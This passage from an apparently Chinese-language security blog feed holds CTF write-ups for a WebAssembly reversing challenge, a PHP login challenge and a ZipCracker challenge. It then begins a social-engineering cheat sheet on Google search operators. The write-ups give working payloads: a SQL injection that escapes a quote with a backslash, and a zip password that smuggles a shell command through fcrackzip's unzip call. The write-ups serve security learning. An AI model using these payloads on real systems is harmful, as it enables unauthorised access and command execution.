class="line"><span class="type">void</span> <span class="title function_">WASM_RT_ADD_PREFIX</span><span class="params">(init)</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  init_func_types();</span><br><span class="line">  init_globals();</span><br><span class="line">  init_memory();</span><br><span class="line">  init_table();</span><br><span class="line">  init_exports();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>反编译出来的 C 源码还是很复杂，可以将其再次编译成可执行文件，用 IDA 打开反编译进行静态分析。再次编译需要使用“wasm-rt.h，wasm-rt-impl.c，wasm-rt-impl.h”这三个文件，可以在 wasm2c 的位置下找到。由于在前端源码里主要调用了 check_flag 函数去检查 flag，所以直接看 check_flag 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">w2c_check_flag</span><span class="params">(<span class="type">int</span> buf_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> f; <span class="comment">// ST24_1</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (++wasm_rt_call_stack_depth &gt; <span class="number">0x1F4</span>u )</span><br><span class="line">    wasm_rt_trap(<span class="number">7LL</span>);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    f = i32_load8_u(&amp;w2c_memory, i + buf_addr);  <span class="comment">// 取出 flag 里第 i 个字符</span></span><br><span class="line">    result |= (i32_load8_u(&amp;w2c_memory, i++ + <span class="number">16</span>) ^ f) ^ <span class="number">0x42</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (i != <span class="number">23</span> );</span><br><span class="line">  --wasm_rt_call_stack_depth;</span><br><span class="line">  <span class="keyword">return</span> result == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 buf_addr 是在前端中调用了 get_buf 函数获取的，该函数直接返回了 80</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">w2c_get_buf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (++wasm_rt_call_stack_depth &gt; <span class="number">0x1F4</span>u )</span><br><span class="line">    wasm_rt_trap(<span class="number">7LL</span>);</span><br><span class="line">  --wasm_rt_call_stack_depth;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">80LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后需要 result 为 0，根据同或的性质，result 在循环中每次迭代时都需要为 0，最后的结果才能使 0，所以表达式 <code>(i32_load8_u(&amp;w2c_memory, i++ + 16) ^ f) ^ 0x42;</code> 将恒为 0。根据异或的性质，则表达式 <code>i32_load8_u(&amp;w2c_memory, i++ + 16) ^ f</code> 将恒为 0x42。根据异或的交换律<code>f = i32_load8_u(&amp;w2c_memory, i + 16) ^ 0x42</code></p><p>flag 位于从 w2c_memory 第 16 位开始，长度为 23，这里的 w2c_memory 在 init_memory 函数中初始化，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_memory</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  wasm_rt_allocate_memory(&amp;w2c_memory, <span class="number">1LL</span>, <span class="number">0x10000</span>LL);</span><br><span class="line">  v0 = w2c_memory + <span class="number">16</span>;</span><br><span class="line">  *v0 = data_segment_data_0;</span><br><span class="line">  *(v0 + <span class="number">8</span>) = <span class="number">0x3131032027152D2E</span>LL;</span><br><span class="line">  *(v0 + <span class="number">16</span>) = <span class="number">0x2E202F27</span>;</span><br><span class="line">  *(v0 + <span class="number">20</span>) = <span class="number">0x3F3B</span>;</span><br><span class="line">  *(v0 + <span class="number">22</span>) = <span class="number">0x42</span>;</span><br><span class="line">  v1 = w2c_memory + <span class="number">48</span>;</span><br><span class="line">  *v1 = data_segment_data_1;</span><br><span class="line">  *(v1 + <span class="number">8</span>) = <span class="number">0x46734967616C4673</span>LL;</span><br><span class="line">  *(v1 + <span class="number">16</span>) = <span class="number">0x7D656B61</span>;</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  *(v1 + <span class="number">20</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>w2c_memory 第 16 为开始被赋值为 data_segment_data_0，data_segment_data_0 的定义为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8 data_segment_data_0[] = &#123;</span><br><span class="line">  <span class="number">0x24</span>, <span class="number">0x2e</span>, <span class="number">0x23</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x0a</span>, <span class="number">0x27</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x15</span>, <span class="number">0x27</span>,</span><br><span class="line">  <span class="number">0x20</span>, <span class="number">0x03</span>, <span class="number">0x31</span>, <span class="number">0x31</span>, <span class="number">0x27</span>, <span class="number">0x2f</span>, <span class="number">0x20</span>, <span class="number">0x2e</span>, <span class="number">0x3b</span>, <span class="number">0x3f</span>, <span class="number">0x42</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>但是从 data_segment_data_0 的第 8 位开始又被赋予了新值，纠正后的结果为[0x24, 0x2e, 0x23, 0x25, 0x39, 0x0a, 0x27, 0x2e, 0x2e, 0x2d, 0x15, 0x27, 0x20, 0x03, 0x31, 0x31, 0x27, 0x2f, 0x20, 0x2e, 0x3b, 0x3f, 0x42]</p><p>最后得到 flag<code>flag&#123;HelloWebAssembly&#125;</code></p><h1 id="Confused-question-225"><a href="#Confused-question-225" class="headerlink" title="Confused question(225)"></a>Confused question(225)</h1><p>直接看前端源码给了两个 hint</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--register.php?username=xxx will reg a new user for you with password &#x27;123&#x27;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--login.php.txt--&gt;</span></span><br></pre></td></tr></table></figure><p>先看 login.php.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./db.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;./flag.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashesForEvery</span>(<span class="params"><span class="variable">$array</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>))&#123;<span class="keyword">return</span> <span class="title function_ invoke__">addslashes</span>(<span class="variable">$array</span>);&#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$array</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$val</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$loginStr</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;loginstr&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]))&#123;<span class="variable">$loginStr</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>,<span class="variable">$loginStr</span>);&#125;</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$loginStr</span>,<span class="variable">$loginStr</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$loginStr</span> <span class="keyword">as</span> <span class="variable">$n</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">addslashesForEvery</span>(<span class="variable">$v</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$n</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$v</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">addslashesForEvery</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from admin where username = &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$DB</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;<span class="variable">$_SESSION</span>[<span class="string">&#x27;adminlogin&#x27;</span>] = <span class="number">1</span>; <span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$n</span> === <span class="string">&#x27;guest&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello Guest!But you cannot log in!&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;null&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了拿到 flag 需要 n==admin，并且 sql 查询需要成功。首先 str_ireplace 将 loginStr 中的所有的 admin 都替换为 guest，这里可以用 GET 数组绕过，例如<code>?loginstr[admin]=123</code>，parse_str 无法处理数组，那么 $logStr 就为<code>[&#39;admin&#39;=&gt;&#39;123&#39;]</code>，满足 n==admin。过了第一个条件以后就需要先办法让 sql 查询成功，由于没给注册，所以只能考虑 sql 注入。</p><p>使用 GET 数组虽然绕过了 n==admin 这个条件，但是 v 就不是一个数组了，只是一个字符串，这时如果把一个字符串当成数组取值的话 php 会将该字符串的第一个字符当作值取出，如果 <code>?loginstr[admin]=&#39;</code> 的话，addslashesForEvery 将 v 过滤以后就变成了<code>\&#39;</code>，这时取出的第一个字符为反斜杠，带入 sql 语句就变成了<code>select * from admin where username = &#39;\&#39; and password = &#39;$password&#39;</code>，这里的反斜杠将 username 后的单引号转义，因此 username 就变成了<code>\&#39; and password =</code>，password 就逃脱了单引号的限制，可以从 password 进行 sql 注入，最后的 payload 为：GET<code>?loginstr[admin]=&#39;</code>，POST<code>password=+ or 1#</code>，带入 sql 语句为<br><code>select * from admin where username = &#39;\&#39; and password = &#39; or 1#&#39;</code></p><p>最后拿到 flag：<code>flag&#123;pHP_H4s_s0_m4Ny_f3a7ur3s&#125;</code></p><h1 id="ZipCracker-225"><a href="#ZipCracker-225" class="headerlink" title="ZipCracker(225)"></a>ZipCracker(225)</h1><p>题目说有源码泄露，先扫一下发现.index.php.swp 文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;title&gt;ZipCracker - Crack Your Zip Online&lt;/title&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;https://cdn.jsdelivr.net/foundation/6.2.1/foundation.min.css&quot;</span>&gt;</span><br><span class="line">&lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;/zipcracker.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">main</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>-<span class="title">bar</span>&quot;&gt;</span></span><br><span class="line"><span class="class">  &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>-<span class="title">bar</span>-<span class="title">title</span>&quot;&gt;<span class="title">ZipCracker</span>&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!<span class="title">empty</span>($<span class="title">_FILES</span>[&#x27;<span class="title">zip</span>&#x27;][&#x27;<span class="title">tmp_name</span>&#x27;]) <span class="title">and</span> !<span class="title">empty</span>($<span class="title">_FILES</span>[&#x27;<span class="title">dict</span>&#x27;][&#x27;<span class="title">tmp_name</span>&#x27;])) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">max</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;size&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]) &lt;= <span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">                <span class="comment">// Do you remember 430387 ?</span></span><br><span class="line">                <span class="variable">$zip</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;zip&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">                <span class="variable">$dict</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;dict&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                <span class="variable">$option</span> = <span class="string">&quot;-D -p <span class="subst">$dict</span>&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unzip&#x27;</span>])) &#123;</span><br><span class="line">                        <span class="variable">$option</span> = <span class="string">&quot;-u &quot;</span>.<span class="variable">$option</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$cmd</span> = <span class="string">&quot;timeout 3 ./fcrackzip-1.0/fcrackzip <span class="subst">$option</span> <span class="subst">$zip</span>&quot;</span>;</span><br><span class="line">                <span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$res</span> = <span class="string">&#x27;file is too large.&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&#x27;file is missing&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>-<span class="title">wrapper</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">head</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Crack</span> <span class="title">Your</span> <span class="title">ZIP</span> <span class="title">Online</span></span></span><br><span class="line"><span class="class">                &lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">container</span>-<span class="title">subhead</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Only</span> <span class="title">dictionary</span>-<span class="title">based</span> <span class="title">crack</span> <span class="title">is</span> <span class="title">available</span>.&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Both</span> <span class="title">zip</span> <span class="title">and</span> <span class="title">dictionary</span> <span class="title">file</span> <span class="title">must</span> <span class="title">not</span> <span class="title">exceed</span> 1<span class="title">MB</span>.</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">zip</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot;&gt;<span class="title">ZIP</span> <span class="title">file</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">zip</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">zip</span>&quot; <span class="title">class</span>=&quot;<span class="title">show</span>-<span class="title">for</span>-<span class="title">sr</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">dict</span>&quot; <span class="title">class</span>=&quot;<span class="title">button</span>&quot;&gt;<span class="title">Dictionary</span> <span class="title">file</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">dict</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">dict</span>&quot; <span class="title">class</span>=&quot;<span class="title">show</span>-<span class="title">for</span>-<span class="title">sr</span>&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                        &lt;<span class="title">input</span> <span class="title">id</span>=&quot;<span class="title">unzip</span>&quot; <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">name</span>=&quot;<span class="title">unzip</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">unzip</span>&quot;&gt;<span class="title">use</span> <span class="title">unzip</span>&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">success</span> <span class="title">button</span>&quot;&gt;<span class="title">Crack</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">res</span>?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最直观的有一个<code>shell_exec($cmd);</code>，但是这里 cmd 命令里面的所有可控输入都是文件的 tmp_name，所以无法直接命令注入，但是这里使用了 fcrackzip 破解 zip 密码，而 fcrackzip 存在命令注入漏洞，当 fcrackzip 开启 unzip 选项时并且找到密码时，fcrackzip 会直接使用该密码解压破解的 zip 文件，而 fcrackzip 正是直接使用了 shell 的 unzip 命令，将 password 带入命令行中没有做任何过滤，因此这里存在一个命令注入漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> REGPARAM <span class="title function_">check_unzip</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *pw)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buff[<span class="number">1024</span>];</span><br><span class="line">    <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span> (buff, <span class="string">&quot;unzip -qqtP \&quot;%s\&quot; %s &quot;</span> DEVNULL, pw, file_path[<span class="number">0</span>]);</span><br><span class="line">    status = system (buff);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> REDIR</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status == EXIT_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n\nPASSWORD FOUND!!!!: pw == %s\n&quot;</span>, pw);</span><br><span class="line">        <span class="built_in">exit</span> (EXIT_SUCCESS);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> !status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以可以给 zip 文件设置密码 <code>aaa&quot;;cat &quot;flag.php</code> 来执行命令拿到 flag，提交的时候记得选择 use unzip。得到 flag 为：<code>flag&#123;bug_430387_cmd_injection&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BlueWhale </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Social Engineering CheatSheet</title>
      <link href="/2019/08/10/Social-Engineering-NoteBook/"/>
      <url>/2019/08/10/Social-Engineering-NoteBook/</url>
      
        <content type="html"><![CDATA[<p>Remember:</p><ol><li>Do not trust anyone.</li><li>Never let them know what you are thinking.</li><li>Keep slience forever.</li></ol><h1 id="信息收集"><a href="# 信息收集" class="headerlink" title="信息收集"></a>信息收集 </h1><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p> 使用 <a href="https://www.google.com/">Google</a> 的 Hacking 技巧进行被动的信息收集是最安全可靠的，但是收集的信息量有限，有时候需要根据经验以及推理进一步收集信息</p><h3 id="原则"><a href="# 原则" class="headerlink" title="原则"></a>原则</h3><ul><li>每次查询使用多关键词而不是句子，例如”电脑 蓝屏 解决”的查询结果要比”电脑为什么蓝屏打不开”更好</li><li>尽量使用和查询有关的专有关键词以缩小范围，例如”电脑 蓝屏”的查询结果要比”电脑 打不开”更加精确</li><li>查询尽量简洁，避免冗余关键词以增加不必要的查询结果</li><li>查询的拼写不一定准确(Google 有自动纠错功能)</li></ul><h3 id="技巧"><a href="# 技巧" class="headerlink" title="技巧"></a>技巧</h3><ul><li>Google 查询关键词的默认连接为”and”</li><li>Google 会直接返回关键词匹配的结果而不会扩展关键词的意义(Google 的简洁性)</li><li>Google 在查询英文时会返回关键词的多种时态</li><li>Google 会忽略终结符，例如中文的”的”，”是”，”了”等虚词，英文的”is”，”to”等</li><li>Google 每次查询的最大长度为 32(超出部分截断)</li><li>两个关键词越近，优先级越高</li><li>关键词越靠前，优先级越高</li><li>Google 大小写不敏感</li><li>Google 会忽略部分标点符号，不会忽略单引号(‘)</li><li>Google 会包含有或没有连字符 (-) 的结果，例如查询”Mr-Li”，Google 会返回”Mr-Li”和”Mr Li”的结果</li></ul><h3 id="查询操作符"><a href="# 查询操作符" class="headerlink" title="查询操作符"></a>查询操作符</h3><table><thead><tr><th>操作符表示</th><th>操作符含义</th></tr></thead><tbody><tr><td>term1 term2 或 term1 and term2</td><td>同时查询包含 term1 和 term2 的结果</td></tr><tr><td>term1 | term2 或 term1 or term2</td><td>查询包含 term1 或包含 term2 的结果</td></tr><tr><td>“term”</td><td>强制查询结果中包含 term</td></tr><tr><td>-term</td><td>强制查询结果中不包含 term</td></tr><tr><td>~term</td><td>查询 term 或者 term 的同义词</td></tr><tr><td>number1..number2</td><td>数字范围</td></tr><tr><td>term1 * term2</td><td>代替任意长度字符</td></tr></tbody></table><h3 id="高级搜索符"><a href="# 高级搜索符" class="headerlink" title="高级搜索符"></a>高级搜索符</h3><blockquote><p>粗体为常用搜索符</p></blockquote><table><thead><tr><th>搜索符表示</th><th>搜索符含义</th></tr></thead><tbody><tr><td>allinanchor:</td><td>后面所有的关键词都位于网页的超链接中</td></tr><tr><td>allintext:</td><td>后面所有的关键词都位于网页的文本中</td></tr><tr><td>allintitle:</td><td>后面所有的关键词度位于网页的标题中</td></tr><tr><td>allinurl:</td><td>后面所有的关键词都位于网页的 url 中</td></tr><tr><td>inanchor:</td><td>关键词位于网页的超链接中</td></tr><tr><td><strong>intext:</strong></td><td>关键词位于网页的文本中</td></tr><tr><td><strong>intitle:</strong></td><td>关键词位于网页的标题中</td></tr><tr><td><strong>inurl:</strong></td><td>关键词位于网页的 url 中</td></tr><tr><td><strong>cache:</strong></td><td>跳转到关键词 url 的网页缓存</td></tr><tr><td>define:</td><td>关键词的定义</td></tr><tr><td><strong>ext/filetype:</strong></td><td>文件类型为关键词的文件</td></tr><tr><td>movie:</td><td>关键词相关的电影</td></tr><tr><td>book:</td><td>关键词相关的书籍</td></tr><tr><td><strong>site:</strong></td><td>限定在关键词 url 